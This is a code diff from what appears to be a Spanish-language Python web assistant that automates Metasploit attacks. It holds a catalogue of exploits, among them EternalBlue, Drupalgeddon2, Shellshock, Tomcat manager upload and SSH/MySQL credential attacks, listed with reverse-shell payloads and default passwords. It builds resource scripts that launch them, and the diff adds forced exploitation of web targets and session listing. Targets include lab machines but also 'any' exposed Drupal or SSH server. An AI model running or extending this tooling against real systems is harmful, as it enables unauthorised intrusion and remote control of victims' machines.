@@ -56,7 +56,7 @@ def is_root():
 # ─────────────────────────────────────────────
 
 EXPLOITS = [
-    {'id':'drupalgeddon2','name':'exploit/unix/webapp/drupal_drupalgeddon2','short':'Drupalgeddon2','desc':'RCE en Drupal 7.x/8.x sin autenticacion','port':'80/tcp','rank':'excellent','cve':'CVE-2018-7600','payload':'php/meterpreter/reverse_tcp','cat':'web','targets':['Metasploitable 3','cualquier Drupal 7/8'],'opts':{'RHOSTS':'','RPORT':'80','TARGETURI':'/','LHOST':'','LPORT':'4444'},'sev':98,'note':'No necesita credenciales. Funciona en cualquier Drupal 7.x o 8.x expuesto en el puerto 80.'},
+    {'id':'drupalgeddon2','name':'exploit/unix/webapp/drupal_drupalgeddon2','short':'Drupalgeddon2','desc':'RCE en Drupal 7.x/8.x sin autenticacion','port':'80/tcp','rank':'excellent','cve':'CVE-2018-7600','payload':'php/meterpreter/reverse_tcp','cat':'web','targets':['Metasploitable 3','cualquier Drupal 7/8'],'opts':{'RHOSTS':'','RPORT':'80','TARGETURI':'/drupal/','LHOST':'','LPORT':'4444'},'sev':98,'note':'No necesita credenciales. Funciona en cualquier Drupal 7.x o 8.x expuesto en el puerto 80.'},
     {'id':'ms17_010','name':'exploit/windows/smb/ms17_010_eternalblue','short':'EternalBlue (MS17-010)','desc':'RCE en SMBv1 Windows 7/2008 sin parche','port':'445/tcp','rank':'excellent','cve':'CVE-2017-0144','payload':'windows/x64/meterpreter/reverse_tcp','cat':'smb','targets':['Windows 7','Windows 2008 R2','Windows XP'],'opts':{'RHOSTS':'','RPORT':'445','LHOST':'','LPORT':'4444'},'sev':100,'note':'Requiere SMBv1 habilitado y que la maquina no tenga el parche MS17-010.'},
     {'id':'ms08_067','name':'exploit/windows/smb/ms08_067_netapi','short':'MS08-067 NetAPI','desc':'RCE en Windows XP/2003 via SMB','port':'445/tcp','rank':'excellent','cve':'CVE-2008-4250','payload':'windows/meterpreter/reverse_tcp','cat':'smb','targets':['Windows XP SP2/SP3','Windows 2003'],'opts':{'RHOSTS':'','RPORT':'445','LHOST':'','LPORT':'4444'},'sev':97,'note':'Clasico de labs. Muy estable en Windows XP SP2/SP3 y Server 2003.'},
     {'id':'unreal_ircd','name':'exploit/unix/irc/unreal_ircd_3281_backdoor','short':'UnrealIRCd 3.2.8.1 Backdoor','desc':'Backdoor en el binario del servidor IRC','port':'6667/tcp','rank':'excellent','cve':'CVE-2010-2075','payload':'cmd/unix/reverse','cat':'irc','targets':['Metasploitable 2','Metasploitable 3'],'opts':{'RHOSTS':'','RPORT':'6667','LHOST':'','LPORT':'4444'},'sev':95,'note':'Shell inmediata sin credenciales. Solo funciona si el puerto 6667 esta abierto.'},
@@ -65,7 +65,7 @@ EXPLOITS = [
     {'id':'tomcat_mgr','name':'exploit/multi/http/tomcat_mgr_upload','short':'Tomcat Manager Upload','desc':'Sube WAR malicioso al manager de Tomcat con credenciales por defecto','port':'8080/tcp','rank':'excellent','cve':'CVE-2009-3843','payload':'java/meterpreter/reverse_tcp','cat':'web','targets':['Metasploitable 3','cualquier Tomcat con creds debiles'],'opts':{'RHOSTS':'','RPORT':'8080','HTTPUSERNAME':'tomcat','HTTPPASSWORD':'tomcat','LHOST':'','LPORT':'4444'},'sev':88,'note':'Credenciales por defecto: tomcat/tomcat. Verifica primero: http://TARGET:8080/manager'},
     {'id':'shellshock','name':'exploit/multi/http/apache_mod_cgi_bash_env_exec','short':'Shellshock (CGI)','desc':'RCE via variable de entorno en bash CGI','port':'80/tcp','rank':'excellent','cve':'CVE-2014-6271','payload':'linux/x86/meterpreter/reverse_tcp','cat':'web','targets':['Metasploitable 2','Apache con CGI'],'opts':{'RHOSTS':'','RPORT':'80','TARGETURI':'/cgi-bin/status','LHOST':'','LPORT':'4444'},'sev':93,'note':'Funciona si el servidor usa bash menor o igual a 4.3 con scripts CGI.'},
     {'id':'heartbleed','name':'auxiliary/scanner/ssl/openssl_heartbleed','short':'Heartbleed (OpenSSL)','desc':'Lee hasta 64KB de memoria del servidor SSL','port':'443/tcp','rank':'great','cve':'CVE-2014-0160','payload':'(scanner)','cat':'net','targets':['cualquier servidor con OpenSSL 1.0.1 a 1.0.1f'],'opts':{'RHOSTS':'','RPORT':'443','VERBOSE':'true'},'sev':85,'note':'Puede extraer claves privadas, cookies y contrasenas en texto claro.'},
-    {'id':'ssh_login','name':'auxiliary/scanner/ssh/ssh_login','short':'SSH Login Bruteforce','desc':'Fuerza bruta SSH con diccionario','port':'22/tcp','rank':'good','cve':'—','payload':'(scanner)','cat':'ssh','targets':['cualquier servidor SSH','Metasploitable 2/3'],'opts':{'RHOSTS':'','RPORT':'22','USERNAME':'root','PASS_FILE':'/usr/share/wordlists/rockyou.txt','THREADS':'10','VERBOSE':'false'},'sev':60,'note':'Combinaciones comunes: root/toor, vagrant/vagrant, msfadmin/msfadmin.'},
+    {'id':'ssh_login','name':'auxiliary/scanner/ssh/ssh_login','short':'SSH Login (credenciales)','desc':'Acceso SSH con usuario y contrasena conocidos','port':'22/tcp','rank':'excellent','cve':'—','payload':'(scanner)','cat':'ssh','targets':['cualquier servidor SSH','Metasploitable 2/3'],'opts':{'RHOSTS':'','RPORT':'22','USERNAME':'vagrant','PASSWORD':'vagrant'},'sev':70,'note':'Credenciales por defecto en Metasploitable 3: vagrant/vagrant (con sudo). En Metasploitable 2: msfadmin/msfadmin.'},
     {'id':'mysql_login','name':'auxiliary/scanner/mysql/mysql_login','short':'MySQL Login Scanner','desc':'Fuerza bruta a servidor MySQL','port':'3306/tcp','rank':'good','cve':'—','payload':'(scanner)','cat':'db','targets':['Metasploitable 2','cualquier MySQL expuesto'],'opts':{'RHOSTS':'','RPORT':'3306','USERNAME':'root','PASSWORD':'','THREADS':'10'},'sev':65,'note':'MySQL en Metasploitable 2 tiene root sin contrasena. Prueba con PASSWORD vacio.'},
     {'id':'handler','name':'exploit/multi/handler','short':'Multi/Handler (listener)','desc':'Listener para recibir conexiones de payloads externos','port':'cualquiera','rank':'excellent','cve':'—','payload':'linux/x86/meterpreter/reverse_tcp','cat':'net','targets':['universal'],'opts':{'LHOST':'','LPORT':'4444'},'sev':0,'note':'Usar cuando ya tienes un payload ejecutado manualmente en la victima.'},
 ]
@@ -279,11 +279,18 @@ def api_msf_stream():
         rc_lines.append(f"set HTTPUSERNAME {exploit['opts']['HTTPUSERNAME']}")
         rc_lines.append(f"set HTTPPASSWORD {exploit['opts']['HTTPPASSWORD']}")
     if 'USERNAME' in exploit['opts']: rc_lines.append(f"set USERNAME {exploit['opts']['USERNAME']}")
+    if 'PASSWORD' in exploit['opts']: rc_lines.append(f"set PASSWORD {exploit['opts']['PASSWORD']}")
     if 'PASS_FILE' in exploit['opts']: rc_lines.append(f"set PASS_FILE {exploit['opts']['PASS_FILE']}")
     if 'THREADS' in exploit['opts']: rc_lines.append(f"set THREADS {exploit['opts']['THREADS']}")
     if exploit['payload'] and not exploit['payload'].startswith('('):
         rc_lines.append(f"set payload {exploit['payload']}")
-    rc_lines += ["run", "exit -y"]
+    # Forzar explotación en exploits web que fallan el check automático
+    if exploit['cat'] == 'web':
+        rc_lines.append("set ForceExploit true")
+    rc_lines.append("run")
+    # Para scanners (ssh/db login) mostrar sesiones abiertas; para exploits mostrar info de sesión
+    rc_lines.append("sessions -l")
+    rc_lines.append("exit -y")
 
     rc_path = f"/tmp/msf_assist_{exploit_id}.rc"
 
